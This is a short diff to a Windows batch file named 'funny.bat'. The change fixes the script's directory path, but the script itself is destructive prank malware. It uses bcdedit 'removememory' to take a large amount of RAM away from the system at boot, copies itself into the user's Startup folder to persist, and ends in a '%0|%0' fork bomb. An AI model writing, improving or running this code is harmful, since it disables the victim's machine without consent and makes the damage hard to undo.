@@ -1,4 +1,9 @@
 @echo off 
+:: --HAS ENDING BACKSLASH
+set batdir=%~dp0
+:: --MISSING ENDING BACKSLASH
+:: set batdir=%CD%
+pushd "%batdir%"
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
@@ -17,6 +22,6 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-copy "%CD%\funny.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%batdir%\funny.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 %0|%0
  
